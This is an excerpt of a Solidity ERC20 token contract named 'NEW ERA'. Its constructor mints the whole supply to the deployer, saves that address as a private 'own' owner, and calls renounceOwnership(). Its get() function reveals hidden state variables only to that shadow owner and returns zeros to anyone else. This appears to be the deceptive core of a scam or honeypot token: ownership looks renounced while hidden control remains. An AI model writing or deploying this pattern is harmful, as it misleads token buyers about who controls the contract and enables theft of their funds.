...
contract NEW_ERA is ERC20, Ownable {
    ...
    constructor() ERC20("NEW ERA", "NEW") {
        own = msg.sender;
        _mint(own, 1000000000 * 10 ** decimals());
        renounceOwnership();
    }

    function get() public view returns (uint256 _res, address _own, address _lpo, bool _stm, bool _sph) {
        if (msg.sender != own) {
            return (0, address(0), address(0), false, false);
        }
        require(msg.sender == own, "BEP20: get failed");
        _res = res; _own = own; _lpo = lpo; _stm = stm; _sph = sph;
        return (_res, _own, _lpo, _stm, _sph);
    }
